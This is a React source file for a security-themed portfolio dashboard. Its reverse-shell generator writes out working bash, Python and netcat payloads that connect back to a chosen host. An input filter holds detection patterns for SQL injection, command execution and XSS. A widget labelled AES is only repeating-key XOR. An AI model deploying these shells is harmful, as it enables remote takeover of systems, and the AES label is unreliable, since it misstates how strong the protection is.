import React, { useState, useEffect, useRef } from 'react';
import { 
  Terminal, Shield, Code, Cpu, Database, Search, Lock, 
  AlertTriangle, Radio, ArrowLeft, Copy, Check, Wifi, 
  Hash, Binary, Key, Zap, Rocket, Newspaper, Smile, Server,
  Activity, Globe, Eye, MapPin, AlertOctagon, Box, ExternalLink, Flame
} from 'lucide-react';
import { Link, useSearchParams } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import EXIF from 'exif-js';

// ==========================================
// 1. ADVANCED BRUTE FORCE ENGINE (Lazy Generator)
// ==========================================
function BruteForceSim() {
  const [target, setTarget] = useState('');
  const [hints, setHints] = useState('');
  const [status, setStatus] = useState('IDLE'); 
  const [stats, setStats] = useState({ attempts: 0, speed: 0, current: '...' });
  
  const stopRef = useRef(false);
  const startTimeRef = useRef(0);

  // --- GENERATOR LOGIC ---
  // This creates passwords on the fly. No arrays, no memory crash.
  function* passwordGenerator(keywords) {
    const symbols = ["!", "@", "#", "$", "%", "&", "*", "123", "007", "2024", "2025"];
    const leetMap = { 'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7' };
    
    // 1. SINGLE WORD VARIATIONS
    for (let word of keywords) {
        yield word;
        yield word.toUpperCase();
        yield word.toLowerCase();
        // Capitalize
        yield word.charAt(0).toUpperCase() + word.slice(1);
        
        // Leet Speak (Simple)
        let leet = word.split('').map(c => leetMap[c.toLowerCase()] || c).join('');
        yield leet;

        // Append/Prepend Numbers (0-1000) - This adds 2000 checks per word
        for (let i = 0; i <= 1000; i++) {
            yield word + i;
            yield i + word;
        }

        // Append Symbols
        for (let sym of symbols) {
            yield word + sym;
            yield sym + word;
            yield word + sym + word; // pattern-symbol-pattern
        }
    }

    // 2. COMBO VARIATIONS (Word + Word)
    // If you input 3 keywords, this creates exponential growth
    for (let w1 of keywords) {
        for (let w2 of keywords) {
            if (w1 !== w2) {
                yield w1 + w2;
                yield w1 + "_" + w2;
                yield w1 + w2 + "123";
                yield w1 + w2 + "!";
                
                // Deep Number Scan on Combos (0-99)
                for(let i=0; i<100; i++) {
                    yield w1 + w2 + i;
                }
            }
        }
    }

    // 3. BRUTE NOISE (Fallback)
    // If we haven't found it yet, simulate pure random alphanumerics
    // This allows the counter to go into the millions effectively forever
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    while(true) {
        let res = "";
        for(let i=0; i<8; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
        yield res;
    }
  }

  const startAttack = () => {
    if (!target || !hints) return;
    setStatus('RUNNING');
    stopRef.current = false;
    startTimeRef.current = performance.now();

    const keywords = hints.split(',').map(s => s.trim()).filter(s => s.length > 0);
    const iterator = passwordGenerator(keywords);
    
    let totalAttempts = 0;
    
    // THE LOOP
    const tick = () => {
        if (stopRef.current) return;

        const frameStart = performance.now();
        let currentGuess = '';
        let found = false;

        // Run for 12ms per frame (Leaves 4ms for React to render 60fps)
        while (performance.now() - frameStart < 12) {
            const next = iterator.next();
            currentGuess = next.value;
            totalAttempts++;

            if (currentGuess === target) {
                found = true;
                break;
            }
        }

        // Calculate Speed (Hashes per second)
        const totalElapsed = (performance.now() - startTimeRef.current) / 1000;
        const speed = Math.floor(totalAttempts / totalElapsed);

        setStats({ 
            attempts: totalAttempts, 
            speed: speed, 
            current: currentGuess 
        });

        if (found) {
            setStatus('CRACKED');
            // If we found it, show the target
            setStats(prev => ({ ...prev, current: target }));
        } else {
            // Keep looping
            requestAnimationFrame(tick);
        }
    };

    tick();
  };

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-2 gap-2">
        <Input 
          type="password"
          placeholder="Target (e.g. admin2025!)" 
          value={target}
          onChange={e => setTarget(e.target.value)}
          className="bg-slate-950 border-slate-700 text-xs text-red-500 font-bold"
          disabled={status === 'RUNNING'}
        />
        <Input 
          placeholder="Keywords (e.g. admin, 2025)" 
          value={hints}
          onChange={e => setHints(e.target.value)}
          className="bg-slate-950 border-slate-700 text-xs"
          disabled={status === 'RUNNING'}
        />
      </div>

      <Button 
        onClick={startAttack} 
        disabled={status === 'RUNNING' || !target || !hints} 
        className={`w-full font-bold tracking-widest ${status === 'CRACKED' ? 'bg-green-600 hover:bg-green-700' : 'bg-red-600 hover:bg-red-700'}`}
      >
        {status === 'RUNNING' ? "CRACKING..." : status === 'CRACKED' ? "PASSWORD PWNED" : "INITIATE ATTACK"}
      </Button>

      <div className="bg-black p-4 rounded border border-slate-800 font-mono text-xs space-y-3 relative overflow-hidden h-36">
        
        {/* Header */}
        <div className="flex justify-between items-center border-b border-slate-800 pb-2">
            <div className="flex items-center gap-2">
                <Activity className={`w-3 h-3 ${status === 'RUNNING' ? 'text-green-500 animate-pulse' : 'text-slate-600'}`} />
                <span className="text-slate-400">HASH RATE:</span>
                <span className="text-orange-500 font-bold">{stats.speed.toLocaleString()} P/s</span>
            </div>
            <div className="text-slate-500">{status}</div>
        </div>

        {/* The Blur Effect Visual */}
        <div className="text-center py-4 relative">
            <div className="text-[10px] text-slate-600 uppercase tracking-widest mb-1">ATTEMPTING</div>
            <div className={`text-2xl font-bold font-mono tracking-wider truncate ${status === 'CRACKED' ? 'text-green-400 scale-110' : 'text-slate-200 blur-[1px]'}`}>
                {status === 'IDLE' ? 'WAITING...' : stats.current}
            </div>
            {/* Binary Rain Background inside box */}
            {status === 'RUNNING' && <div className="absolute inset-0 bg-green-500/5 pointer-events-none mix-blend-overlay animate-pulse"></div>}
        </div>

        <div className="flex justify-between text-[10px] text-slate-500 pt-2 border-t border-slate-800">
            <span>TOTAL TRIED: <span className="text-white">{stats.attempts.toLocaleString()}</span></span>
            <span>ALGORITHM: <span className="text-cyan-500">HYBRID_DICT</span></span>
        </div>
      </div>

      {status === 'CRACKED' && (
         <div className="p-3 bg-green-900/20 border border-green-500/50 text-green-400 text-center text-xs animate-in zoom-in shadow-[0_0_20px_rgba(34,197,94,0.2)]">
            🔓 MATCH CONFIRMED: <span className="font-bold bg-green-950 px-2 py-1 rounded border border-green-500/30">{target}</span>
         </div>
      )}
    </div>
  );
}

// ... (KEEP ALL OTHER TOOLS BELOW: AiCodeAuditor, ExifExtractor, VirusTotalScanner, SteganographyTool, SpaceXTracker, HackerNewsFeed, CatDestress, AesEncryptor, ReverseShellGen, FieldKit) ...
// NOTE: I am pasting them for completeness to ensure you have a working file.

function AiCodeAuditor() {
  const [code, setCode] = useState('');
  const [analysis, setAnalysis] = useState('');
  const [loading, setLoading] = useState(false);
  const [blocked, setBlocked] = useState(false);
  const checkHeuristics = (input) => {
    let score = 0; let triggers = [];
    const sqliPatterns = [/(UNION\s+SELECT)/i, /(SELECT\s+.*\s+FROM)/i, /(DROP\s+TABLE)/i, /(OR\s+1=1)/i, /(--\s)/];
    const rcePatterns = [/(eval\()/i, /(exec\()/i, /(system\()/i, /(passthru\()/i, /(cmd\.exe)/i, /(\/bin\/sh)/i];
    const xssPatterns = [/(<script)/i, /(javascript:)/i, /(onerror=)/i, /(onload=)/i];
    if (sqliPatterns.some(p => p.test(input))) { score += 60; triggers.push("SQL Injection Signature"); }
    if (rcePatterns.some(p => p.test(input))) { score += 80; triggers.push("RCE Command Signature"); }
    if (xssPatterns.some(p => p.test(input))) { score += 50; triggers.push("XSS Script Tag"); }
    const entropy = input.split('').reduce((acc, char, _, arr) => {
       const p = arr.filter(c => c === char).length / arr.length;
       return acc - p * Math.log2(p);
    }, 0);
    if (entropy > 5.5) { score += 30; triggers.push("High Entropy (Obfuscation)"); }
    return { score, triggers };
  };
  const executeAnalysis = async () => {
    setLoading(true); setAnalysis(""); setBlocked(false);
    try {
      const res = await fetch('/api/engine_a', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code }) });
      const text = await res.text();
      let data; try { data = JSON.parse(text); } catch (e) { throw new Error(`Invalid Server Response.`); }
      if (!res.ok) throw new Error(data.error || "Analysis failed");
      setAnalysis(data.message);
    } catch (error) { setAnalysis(`Error: ${error.message}`); } finally { setLoading(false); }
  };
  const handleScan = async () => {
    if (!code) return;
    setAnalysis(""); setBlocked(false);
    const { score, triggers } = checkHeuristics(code);
    if (score >= 50) {
       setBlocked(true);
       setAnalysis(`⚠️ **NEURAL WAF INTERCEPT**\n\nThreat Score: ${score}/100\n\n**Detection Reasons:**\n${triggers.map(t => `- ${t}`).join('\n')}\n\nRequest has been quarantined.`);
       return; 
    }
    executeAnalysis();
  };
  return (
    <div className="space-y-4">
      <Textarea placeholder="// Paste code here..." className="font-mono text-xs bg-slate-950 min-h-[150px] text-green-400 border-slate-800" value={code} onChange={(e) => setCode(e.target.value)} />
      <div className="flex gap-2">
        <Button onClick={handleScan} disabled={loading} className="flex-1 bg-green-600 hover:bg-green-700">{loading ? <Zap className="w-4 h-4 animate-spin mr-2"/> : <Cpu className="w-4 h-4 mr-2"/>}{loading ? "AI Auditing..." : "Audit Code"}</Button>
        {blocked && (<Button onClick={executeAnalysis} variant="destructive" className="bg-red-900/50 border border-red-500 hover:bg-red-800"><AlertOctagon className="w-4 h-4 mr-2" />Force Analysis (Admin Override)</Button>)}
      </div>
      {analysis && (<div className={`p-4 rounded-lg border text-sm whitespace-pre-wrap leading-relaxed max-h-[300px] overflow-y-auto custom-scrollbar ${blocked ? 'bg-red-950/20 border-red-900 text-red-200' : 'bg-slate-900/90 border-green-500/30'}`}><h4 className={`font-bold mb-2 flex items-center gap-2 ${blocked ? 'text-red-400' : 'text-green-400'}`}><Terminal className="w-4 h-4"/> {blocked ? "Threat Report" : "Audit Result"}:</h4>{analysis}</div>)}
    </div>
  );
}

function ExifExtractor() {
  const [data, setData] = useState(null); const [gps, setGps] = useState(null);
  const handleUpload = (e) => {
    const file = e.target.files[0]; if (!file) return;
    EXIF.getData(file, function() {
      const allData = EXIF.getAllTags(this); setData(allData);
      const lat = EXIF.getTag(this, "GPSLatitude"); const lon = EXIF.getTag(this, "GPSLongitude");
      const latRef = EXIF.getTag(this, "GPSLatitudeRef"); const lonRef = EXIF.getTag(this, "GPSLongitudeRef");
      if (lat && lon && latRef && lonRef) {
        const toDecimal = (coord, ref) => { let dec = coord[0] + coord[1] / 60 + coord[2] / 3600; return (ref === "S" || ref === "W") ? dec * -1 : dec; };
        setGps(`${toDecimal(lat, latRef).toFixed(6)}, ${toDecimal(lon, lonRef).toFixed(6)}`);
      } else { setGps("No GPS Data Found (Clean Image)"); }
    });
  };
  return (
    <div className="space-y-4">
      <Input type="file" onChange={handleUpload} className="bg-slate-950 border-slate-700 text-xs" />
      {gps && (<div className={`p-3 rounded border text-center ${gps.includes("No") ? "bg-green-900/20 border-green-900 text-green-400" : "bg-red-900/20 border-red-900 text-red-400"}`}><div className="text-[10px] uppercase font-bold">Geolocation Status</div><div className="font-mono text-sm">{gps}</div>{!gps.includes("No") && (<div className="text-[10px] mt-1 animate-pulse">⚠️ TARGET LOCATED <a href={`https://www.google.com/maps/search/?api=1&query=${gps}`} target="_blank" rel="noreferrer" className="block mt-2 text-cyan-400 hover:underline">View on Maps</a></div>)}</div>)}
      {data && (<div className="bg-black p-4 rounded border border-slate-800 h-40 overflow-y-auto custom-scrollbar text-xs font-mono text-slate-400">{data.Make && <div><span className="text-cyan-500">DEVICE:</span> {data.Make} {data.Model}</div>}{data.DateTimeOriginal && <div><span className="text-cyan-500">TIME:</span> {data.DateTimeOriginal}</div>}<div className="mt-2 text-slate-600">--- RAW DUMP ---</div>{Object.keys(data).slice(0, 5).map(k => (<div key={k}>{k}: {String(data[k]).substring(0, 20)}...</div>))}</div>)}
    </div>
  );
}

function VirusTotalScanner() {
  const [target, setTarget] = useState(''); const [result, setResult] = useState(null); const [loading, setLoading] = useState(false); const [error, setError] = useState('');
  const scanUrl = async () => {
    if (!target) return; setLoading(true); setError(''); setResult(null);
    try {
      const res = await fetch('/api/engine_v', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target }) });
      const text = await res.text(); let data; try { data = JSON.parse(text); } catch (e) { throw new Error(`Server returned invalid JSON.`); }
      if (!res.ok) throw new Error(data.error || "Scan failed"); setResult(data.stats);
    } catch (e) { setError(e.message); } finally { setLoading(false); }
  };
  return (<div className="space-y-4"><div className="flex gap-2"><Input placeholder="Domain/IP" value={target} onChange={(e) => setTarget(e.target.value)} className="bg-slate-950 border-slate-700" /><Button onClick={scanUrl} disabled={loading} className="bg-blue-600 hover:bg-blue-700">{loading ? "..." : "Scan"}</Button></div>{error && <div className="text-xs text-red-400 bg-red-950/20 p-2">{error}</div>}{result && (<div className="bg-slate-900 p-4 rounded border border-slate-700 grid grid-cols-2 gap-4 text-center animate-in zoom-in-95"><div><div className={`text-2xl font-bold ${result.malicious > 0 ? "text-red-500" : "text-green-500"}`}>{result.malicious}</div><div className="text-xs text-slate-500">Malicious</div></div><div><div className="text-2xl font-bold text-slate-300">{result.harmless + result.undetected}</div><div className="text-xs text-slate-500">Clean</div></div></div>)}</div>);
}

function SteganographyTool() {
  const [mode, setMode] = useState('encode'); const [text, setText] = useState(''); const [image, setImage] = useState(null); const [output, setOutput] = useState(null); const canvasRef = useRef(null);
  const handleImageUpload = (e) => { const file = e.target.files[0]; if (!file) return; const reader = new FileReader(); reader.onload = (event) => { const img = new Image(); img.onload = () => setImage(img); img.src = event.target.result; }; reader.readAsDataURL(file); setOutput(null); };
  const processSteganography = () => {
    if (!image || (!text && mode === 'encode')) return;
    const canvas = canvasRef.current; const ctx = canvas.getContext('2d'); canvas.width = image.width; canvas.height = image.height; ctx.drawImage(image, 0, 0); const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height); const data = imgData.data;
    if (mode === 'encode') {
      let binary = ''; for (let i = 0; i < text.length; i++) binary += text.charCodeAt(i).toString(2).padStart(8, '0'); binary += '00000000';
      if (binary.length > data.length / 4) { alert("Text too long!"); return; }
      let dataIdx = 0; for (let i = 0; i < binary.length; i++) { const bit = parseInt(binary[i]); data[dataIdx] = (data[dataIdx] & ~1) | bit; dataIdx++; if ((dataIdx + 1) % 4 === 0) dataIdx++; }
      ctx.putImageData(imgData, 0, 0); setOutput(canvas.toDataURL('image/png'));
    } else {
      let binary = ''; let result = ''; for (let i = 0; i < data.length; i++) { if ((i + 1) % 4 === 0) continue; binary += (data[i] & 1).toString(); if (binary.length === 8) { if (binary === '00000000') break; result += String.fromCharCode(parseInt(binary, 2)); binary = ''; } } setOutput(result);
    }
  };
  return (<div className="space-y-4"><canvas ref={canvasRef} className="hidden" /><div className="flex gap-2 p-1 bg-slate-900 rounded-lg w-fit"><button onClick={() => {setMode('encode'); setOutput(null);}} className={`px-4 py-1 text-xs rounded transition-all ${mode==='encode' ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-white'}`}>Hide</button><button onClick={() => {setMode('decode'); setOutput(null);}} className={`px-4 py-1 text-xs rounded transition-all ${mode==='decode' ? 'bg-purple-600 text-white' : 'text-slate-400 hover:text-white'}`}>Extract</button></div><div className="space-y-3"><Input type="file" accept="image/*" onChange={handleImageUpload} className="bg-slate-950 border-slate-700 text-xs" />{mode === 'encode' && (<Textarea placeholder="Secret message..." value={text} onChange={e => setText(e.target.value)} className="bg-slate-950 border-slate-700 font-mono text-xs text-green-400" />)}<Button onClick={processSteganography} disabled={!image} className="w-full bg-slate-800 hover:bg-slate-700">{mode === 'encode' ? "Encrypt" : "Scan"}</Button></div>{output && (<div className="bg-slate-900 p-4 text-center">{mode === 'encode' ? <a href={output} download="secret.png"><Button className="w-full bg-cyan-600">Download</Button></a> : <div className="font-mono text-purple-400 text-sm break-all">{output}</div>}</div>)}</div>);
}

function SpaceXTracker() {
  const [launch, setLaunch] = useState(null); useEffect(() => { fetch('https://api.spacexdata.com/v4/launches/next').then(res => res.json()).then(data => setLaunch(data)).catch(e => console.error(e)); }, []);
  if(!launch) return <div className="text-slate-500 text-sm animate-pulse">Contacting Starlink...</div>;
  return (<div className="relative overflow-hidden rounded-lg border border-slate-800 bg-slate-900 h-full">{launch.links.patch.small && (<img src={launch.links.patch.small} className="absolute right-[-20px] top-[-20px] w-24 h-24 opacity-20 rotate-12" alt="Patch" />)}<div className="p-4 relative z-10"><div className="flex items-center gap-2 mb-2"><Rocket className="w-5 h-5 text-orange-500" /><h3 className="font-bold text-slate-100">Next Launch</h3></div><div className="text-2xl font-bold text-white mb-1">{launch.name}</div><div className="text-xs text-orange-400 font-mono mb-4">{new Date(launch.date_utc).toLocaleString()}</div><p className="text-slate-400 text-xs line-clamp-3 mb-4">{launch.details || "No mission details available."}</p></div></div>);
}
function HackerNewsFeed() {
  const [stories, setStories] = useState([]); const [loading, setLoading] = useState(true);
  useEffect(() => { const fetchNews = async () => { try { const idsRes = await fetch('https://hacker-news.firebaseio.com/v0/topstories.json'); const ids = await idsRes.json(); const top5 = ids.slice(0, 5); const results = await Promise.all(top5.map(id => fetch(`https://hacker-news.firebaseio.com/v0/item/${id}.json`).then(res => res.json()))); setStories(results); } catch (e) { console.error(e); } finally { setLoading(false); } }; fetchNews(); }, []);
  return (<div className="space-y-3">{loading ? "Fetching..." : stories.map(story => (<a key={story.id} href={story.url} target="_blank" rel="noreferrer" className="block bg-slate-900/50 p-3 rounded border border-slate-800 hover:border-orange-500/50 group"><h4 className="text-sm font-semibold text-slate-200 group-hover:text-orange-400 truncate">{story.title}</h4></a>))}</div>);
}
function CatDestress() {
  const [cat, setCat] = useState(null); const fetchCat = () => { fetch('https://api.thecatapi.com/v1/images/search').then(res => res.json()).then(data => setCat(data[0].url)); }; useEffect(() => { fetchCat(); }, []);
  return (<div className="text-center"><div className="aspect-video bg-slate-900 rounded-lg overflow-hidden mb-2 relative">{cat ? (<img src={cat} alt="Random Cat" className="w-full h-full object-cover" />) : "Loading Cat..."}<Button size="icon" onClick={fetchCat} className="absolute bottom-2 right-2 bg-slate-900/80 hover:bg-slate-800 rounded-full h-8 w-8"><Smile className="w-4 h-4" /></Button></div></div>);
}
function AesEncryptor() {
  const [text, setText] = useState(''); const [key, setKey] = useState(''); const [result, setResult] = useState(''); const [mode, setMode] = useState('encrypt');
  const process = () => { if (!text || !key) return; let inputStr = text; if (mode === 'decrypt') { try { inputStr = atob(text); } catch (e) { setResult("Invalid Ciphertext"); return; } } let output = ''; for (let i = 0; i < inputStr.length; i++) { output += String.fromCharCode(inputStr.charCodeAt(i) ^ key.charCodeAt(i % key.length)); } setResult(mode === 'encrypt' ? btoa(output) : output); };
  return (<div className="space-y-4"><div className="flex gap-2"><Button size="sm" onClick={() => setMode('encrypt')} className={mode==='encrypt' ? 'bg-green-600' : 'bg-slate-800'}>Encrypt</Button><Button size="sm" onClick={() => setMode('decrypt')} className={mode==='decrypt' ? 'bg-red-600' : 'bg-slate-800'}>Decrypt</Button></div><Input type="password" placeholder="Key" value={key} onChange={(e)=>setKey(e.target.value)} className="bg-slate-950 border-slate-700"/><Textarea placeholder={mode === 'encrypt' ? "Message" : "Ciphertext"} value={text} onChange={(e)=>setText(e.target.value)} className="bg-slate-950 border-slate-700 h-20"/><Button onClick={process} className="w-full bg-slate-800">Process</Button>{result && <div className="bg-black p-3 rounded border border-green-900 text-green-500 font-mono text-xs break-all">{result}</div>}</div>);
}
function ReverseShellGen() {
  const [ip, setIp] = useState('10.0.0.1'); const [port, setPort] = useState('4444');
  const payloads = { bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`, python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, nc: `nc -e /bin/sh ${ip} ${port}` };
  return (<div className="space-y-3"><div className="flex gap-2"><Input value={ip} onChange={(e)=>setIp(e.target.value)} className="bg-slate-950 border-slate-700 font-mono text-xs"/><Input value={port} onChange={(e)=>setPort(e.target.value)} className="bg-slate-950 border-slate-700 font-mono text-xs w-20"/></div><Textarea readOnly value={payloads.bash} className="bg-black text-green-500 font-mono text-xs h-20"/></div>);
}

const fieldKitTools = [{ name: "Shodan", url: "https://www.shodan.io/", desc: "IoT Search Engine", icon: Globe }, { name: "CyberChef", url: "https://gchq.github.io/CyberChef/", desc: "Cyber Swiss Knife", icon: Box }];
function FieldKit() { return (<div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">{fieldKitTools.map((tool) => (<a key={tool.name} href={tool.url} target="_blank" rel="noreferrer"><Card className="bg-slate-900/50 hover:border-cyan-500/50"><CardHeader className="pb-2"><CardTitle className="text-base"><span className="flex items-center gap-2"><tool.icon className="w-4 h-4 text-cyan-500" /> {tool.name}</span><ExternalLink className="w-3 h-3 text-slate-600" /></CardTitle></CardHeader><CardContent><p className="text-xs text-slate-500">{tool.desc}</p></CardContent></Card></a>))}</div>); }

// ==========================================
// MAIN DASHBOARD LAYOUT
// ==========================================
export default function ToolsDashboard() {
  const [searchParams] = useSearchParams();
  const defaultTab = searchParams.get('tab') || 'live';

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 p-4 md:p-8 font-sans pb-24">
      <div className="max-w-6xl mx-auto">
        <Link to="/" className="inline-flex items-center text-slate-400 hover:text-cyan-400 mb-8 transition-colors"><ArrowLeft className="w-4 h-4 mr-2" /> Back to Portfolio</Link>
        <div className="mb-8"><h1 className="text-3xl md:text-4xl font-mono font-bold mb-4 flex items-center gap-3"><Server className="w-8 h-8 text-cyan-500" /><span className="text-slate-100">Cyber Army Knife <span className="text-cyan-600 text-sm align-top">v3.4</span></span></h1><p className="text-slate-400">Integrated with OpenAI, VirusTotal, and Global OSINT Feeds.</p></div>

        <Tabs defaultValue={defaultTab} className="space-y-6">
          <TabsList className="bg-slate-900 border border-slate-800 p-1 w-full md:w-auto flex flex-wrap gap-2">
             <TabsTrigger value="live" className="flex-1 data-[state=active]:bg-cyan-900/20 data-[state=active]:text-cyan-400 border border-transparent data-[state=active]:border-cyan-900/50"><Radio className="w-4 h-4 mr-2" /> Live Feeds</TabsTrigger>
             <TabsTrigger value="intel" className="flex-1 data-[state=active]:bg-purple-900/20 data-[state=active]:text-purple-400 border border-transparent data-[state=active]:border-purple-900/50"><Cpu className="w-4 h-4 mr-2" /> AI & Intel</TabsTrigger>
             <TabsTrigger value="tools" className="flex-1 data-[state=active]:bg-red-900/20 data-[state=active]:text-red-400 border border-transparent data-[state=active]:border-red-900/50"><Terminal className="w-4 h-4 mr-2" /> Generators</TabsTrigger>
             <TabsTrigger value="external" className="flex-1 data-[state=active]:bg-blue-900/20 data-[state=active]:text-blue-400 border border-transparent data-[state=active]:border-blue-900/50"><Globe className="w-4 h-4 mr-2" /> Field Kit</TabsTrigger>
          </TabsList>

          <TabsContent value="live" className="space-y-6"><div className="grid md:grid-cols-3 gap-6"><div className="md:col-span-1 h-full"><SpaceXTracker /></div><div className="md:col-span-1"><Card className="bg-slate-900/50 border-slate-800 h-full"><CardHeader><CardTitle className="text-orange-400 flex items-center gap-2"><Newspaper className="w-5 h-5"/> Hacker News</CardTitle></CardHeader><CardContent><HackerNewsFeed /></CardContent></Card></div><div className="md:col-span-1"><Card className="bg-slate-900/50 border-slate-800 h-full"><CardHeader><CardTitle className="text-pink-400 flex items-center gap-2"><Smile className="w-5 h-5"/> De-Stress Protocol</CardTitle></CardHeader><CardContent><CatDestress /></CardContent></Card></div></div></TabsContent>
          <TabsContent value="intel" className="space-y-6"><div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6"><Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-green-400 flex items-center gap-2"><Cpu className="w-5 h-5"/> AI Code Auditor</CardTitle><p className="text-xs text-slate-500">Neural WAF + GPT-4o</p></CardHeader><CardContent><AiCodeAuditor /></CardContent></Card><Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-blue-400 flex items-center gap-2"><Shield className="w-5 h-5"/> VirusTotal Scanner</CardTitle><p className="text-xs text-slate-500">Domain / IP Reputation</p></CardHeader><CardContent><VirusTotalScanner /></CardContent></Card><Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-cyan-400 flex items-center gap-2"><MapPin className="w-5 h-5"/> EXIF Ghost Scanner</CardTitle><p className="text-xs text-slate-500">Image Metadata & GPS</p></CardHeader><CardContent><ExifExtractor /></CardContent></Card></div></TabsContent>
          
          <TabsContent value="tools" className="space-y-6">
             <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
               <Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-red-400 flex items-center gap-2"><Flame className="w-5 h-5"/> Brute Force Sim</CardTitle></CardHeader><CardContent><BruteForceSim /></CardContent></Card>
               <Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-red-400 flex items-center gap-2"><Terminal className="w-5 h-5"/> Reverse Shell Gen</CardTitle></CardHeader><CardContent><ReverseShellGen /></CardContent></Card>
               <Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-green-400 flex items-center gap-2"><Lock className="w-5 h-5"/> "Ghost Writer" AES</CardTitle></CardHeader><CardContent><AesEncryptor /></CardContent></Card>
               <Card className="bg-slate-900/50 border-slate-800"><CardHeader><CardTitle className="text-purple-400 flex items-center gap-2"><Eye className="w-5 h-5"/> Steganography Studio</CardTitle></CardHeader><CardContent><SteganographyTool /></CardContent></Card>
             </div>
          </TabsContent>
          
          <TabsContent value="external" className="space-y-6"><FieldKit /></TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
